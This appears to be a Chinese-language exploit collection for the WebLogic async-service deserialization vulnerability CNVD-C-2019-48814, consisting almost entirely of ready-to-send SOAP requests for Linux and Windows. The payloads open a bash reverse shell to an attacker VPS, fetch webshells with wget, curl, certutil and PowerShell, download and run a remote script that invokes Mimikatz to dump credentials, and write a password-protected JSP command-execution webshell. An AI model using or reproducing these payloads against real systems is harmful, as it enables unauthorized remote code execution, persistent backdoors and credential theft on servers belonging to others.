# CNVD-C-2019-48814和CNNVD-201904-961</br>
感谢t00ls-ximcx0101提供脚本</br>
CNVD-C-2019-48814 POC Summary</br>
目前清水大佬简书已经更新反序列化上传POC。</br>
相关链接如下:</br>
清水大佬的博客:
https://www.jianshu.com/p/c4982a845f55</br>
安全祖师爷转发:
https://dwz.cn/2GQvbUae</br>

影响范围:WebLogic 10.*、12.1.3</br>
在Weblogic 10.*测试通过：</br>
1.Linux
反弹SHELL</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 853
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/vpsip/vpsport 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
远程下载Webshell</br>
访问地址:http://ip:port/_async/webshell.jsp</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 789
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>wget http://vpsip:vpsport/webshell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 789
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>curl http://vpsip:vpsport/webshell.txt -o servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
写入Webshell</br>
访问地址:http://ip:port/_async/webshell.jsp?pwd=123&cmd=whoami</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.50.219:7001
Content-Length: 1378
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
访问地址:http://ip:port/bea_wls_internal/webshell.jsp?pwd=123&cmd=whoami</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.50.219:7001
Content-Length: 1376
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
2、Win</br>
反弹shell:</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 861
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>powershell "IEX (New-Object Net.WebClient).DownloadString('http://ip:port/payload.ps1'); Invoke-Mimikatz -DumpCreds"</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
远程下载Webshell:</br>
访问地址:http://ip:port/_async/webshell.jsp</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 854
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>powershell (new-object System.Net.WebClient).DownloadFile( 'http://ip:port/webshell.txt','servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp')</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 854
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>certutil -urlcache -split -f http://ip:port/webshell.txt servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
写入Webshell:</br>
访问地址:http://ip:port/_async/webshell.jsp?pwd=123&cmd=whoami</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 1367
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4=  > servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\webshell.txt</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 913
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>certutil -decode servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\webshell.txt servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\webshell.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
访问地址：http://ip:port/bea_wls_internal/webshell.jsp?pwd=123&cmd=whoami</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 1367
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4=  > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.txt</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 913
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>cmd</string>
</void>
<void index="1">
<string>/c</string>
</void>
<void index="2">
<string>certutil -decode servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.txt servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp</string>
</void>
</array>
<void method="start"/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
3、通用</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: xxx.xxx.xxx.xxx:7001
Content-Length: 677
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>xx</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>
```
4、通用写入shell，在Weblogic 10.*和12.1.3测试通过</br>
测试POC:</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: 192.168.86.251:7001
Content-Length: 831
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
<soapenv:Header> 
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("test"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```
EXP:</br>
访问地址:http://ip:port/_async/webshell.jsp?pwd=123&cmd=whoami</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 1142
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string><void method="println"><string><![CDATA[
<%
    if("123".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;          
        byte[] b = new byte[1024];          
        out.print("<pre>");          
        while((a=in.read(b))!=-1){
            out.println(new String(b));          
        }
        out.print("</pre>");
    } 
    %>]]>
</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```
访问地址:http://ip:port/bea_wls_internal/webshell.jsp?pwd=123&cmd=whoami</br>
```
POST /_async/AsyncResponseService HTTP/1.1
Host: ip:port
Content-Length: 1136
Accept-Encoding: gzip, deflate
SOAPAction: 
Accept: */*
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
Connection: keep-alive
content-type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp</string><void method="println"><string><![CDATA[
<%
    if("123".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;          
        byte[] b = new byte[1024];          
        out.print("<pre>");          
        while((a=in.read(b))!=-1){
            out.println(new String(b));          
        }
        out.print("</pre>");
    } 
    %>]]>
</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>
```
